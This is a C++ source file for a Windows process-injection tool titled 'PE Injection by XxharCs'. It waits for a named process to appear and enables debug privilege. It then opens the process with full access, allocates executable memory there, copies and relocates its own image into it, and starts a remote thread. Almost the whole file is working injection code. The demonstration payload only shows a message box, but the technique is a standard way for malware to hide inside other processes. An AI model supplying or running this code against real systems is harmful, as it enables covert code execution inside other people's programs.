#include <Windows.h>
#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <conio.h>
#include <tlhelp32.h>
#include "main.h"

//---------------------------------------------------------------------------------------------------------------------------------------------------//

int main(int argc, char **argv)
{
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_DATA_DIRECTORY pIDD;
	PIMAGE_BASE_RELOCATION pIBR;

	HMODULE hModule;
	HANDLE hProcess, hThread;
	PVOID image, mem;
	DWORD i, count, nSizeOfImage;
	DWORD_PTR delta, OldDelta;
	LPWORD list;
	PDWORD_PTR p;
	BOOLEAN enabled;
	NTSTATUS status;

	OBJECT_ATTRIBUTES objAttr;
	CLIENT_ID cID;

	DWORD dwPid = 0;

	SetConsoleTitleA("PE Injection by XxharCs");

	if(argc != 2)
	{
		std::cout << "Usage: PEInjection.exe [process_name]\n";
		_getch();
		return 1;
	}

	// Loading needed libraries
	_RtlCreateUserThread RtlCreateUserThread = (_RtlCreateUserThread)GetLibraryProcAddress("ntdll.dll", "RtlCreateUserThread");
	_RtlImageNtHeader RtlImageNtHeader = (_RtlImageNtHeader)GetLibraryProcAddress("ntdll.dll", "RtlImageNtHeader");
	_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetLibraryProcAddress("ntdll.dll", "RtlAdjustPrivilege");
	_NtOpenProcess NtOpenProcess = (_NtOpenProcess)GetLibraryProcAddress("ntdll.dll", "NtOpenProcess");
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetLibraryProcAddress("ntdll.dll", "NtWriteVirtualMemory");
	_NtClose NtClose = (_NtClose)GetLibraryProcAddress("ntdll.dll", "NtClose");
	_NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)GetLibraryProcAddress("ntdll.dll", "NtWaitForSingleObject");


	std::cout << "Waiting for the process...\n\n";
	while (!ProcessExists(argv[1])){ }
	dwPid = GetProcID(argv[1]);


	RtlAdjustPrivilege(20, TRUE, FALSE, &enabled);

	hModule = GetModuleHandle(NULL);
	pINH = RtlImageNtHeader(hModule);
	nSizeOfImage = pINH->OptionalHeader.SizeOfImage;

	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	cID.UniqueProcess = (PVOID)dwPid;
	cID.UniqueThread = 0;

	std::cout << "Opening target process handle...\n";
	// Opening target process handle
	if(!NT_SUCCESS(status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cID)))
	{
		std::cout << "Error: Unable to open target process handle. NtOpenProcess failed with status: " << status << "\n";

		_getch();
		return 1;
	}

	std::cout << "Successfully opened target process handle!\n";


	std::cout << "Allocating memory in the target process...\n";
	// Allocating memory in the target process
	mem = VirtualAllocEx(hProcess, NULL, nSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if(mem == NULL)
	{
		std::cout << "Error: Unable to allocate memory in the target process. " << GetLastError() << "\n";
		NtClose(hProcess);

		_getch();
		return 1;
	}

	std::cout << "Memory allocated. Address: 0x" << mem <<"\n";
	image = VirtualAlloc(NULL, nSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(image, hModule, nSizeOfImage);

	pIDD = &pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)image + pIDD->VirtualAddress);

	delta = (DWORD_PTR)((LPBYTE)mem - pINH->OptionalHeader.ImageBase);
	OldDelta = (DWORD_PTR)((LPBYTE)hModule - pINH->OptionalHeader.ImageBase);

	while(pIBR->VirtualAddress !=0)
	{
		if(pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
		{
			count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			list = (LPWORD)((LPBYTE)pIBR + sizeof(IMAGE_BASE_RELOCATION));

			for(i=0; i<count; i++)
			{
				if(list[i] > 0)
				{
					p = (PDWORD_PTR)((LPBYTE)image + (pIBR->VirtualAddress + (0x0fff & (list[i]))));

					*p -= OldDelta;
					*p += delta;
				}
			}
		}

		pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
	}

	std::cout << "Writing executable image into target process...\n";
	// Writing executable image into target process
	if(!NT_SUCCESS(status = NtWriteVirtualMemory(hProcess, mem, image, nSizeOfImage, NULL)))
	{
		std::cout << "Error: Unable to write executable image into target process. NtWriteVirtualMemory failed with status: " << status << "\n";
		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
		NtClose(hProcess);
		VirtualFree(mem, 0, MEM_RELEASE);

		_getch();
		return 1;
	}

	std::cout << "Executable image successfully written to target process!\n";

	std::cout << "Creating remote thread in target process...\n";
	// Creating remote thread in target process
	if(!NT_SUCCESS(status = RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0,(PVOID)((LPBYTE)mem + (DWORD_PTR)(LPBYTE)FuncThread - (LPBYTE)hModule), NULL, &hThread, NULL)))
	{
		std::cout << "Error: Unable to create remote thread in target process. RtlCreateUserThread failed with status: " << status << "\n";
		VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
		NtClose(hProcess);
		VirtualFree(image, 0, MEM_RELEASE);

		_getch();
		return 1;
	}

	std::cout << "Thread successfully created! Waiting for the thread to terminate...\n";
	NtWaitForSingleObject(hThread, FALSE, NULL);

	std::cout << "Thread terminated!\n";
	NtClose(hThread);

	std::cout << "Freeing allocated memory...\n";
	VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
	NtClose(hProcess);
	VirtualFree(image, 0, MEM_RELEASE);

	std::cout << "Allocated memory is free!\n";
	
	_getch();
	return 0;
}

DWORD WINAPI FuncThread(LPVOID unused)
{
	MessageBoxA(NULL, "Wuhu, i'm inside the other process!!!!!", "1337 h4xX0r", MB_OK);
	
	Sleep(10);

	ExitThread(0);
	return 0;
}

DWORD GetProcID(std::string ProcName)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);
	do{
		if(strcmp(pe32.szExeFile,ProcName.c_str()) == 0)
		{
            DWORD ProcId = pe32.th32ProcessID;
            CloseHandle(hProcessSnap);
            return ProcId;
		}
	} 
	while(Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return 0;
}

BOOL ProcessExists(std::string process)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);
	do{
		if(strcmp(pe32.szExeFile,process.c_str()) == 0)
		{
            CloseHandle(hProcessSnap);
            return true;
		}
	} 
	while(Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return false;
}

PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName)
{
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}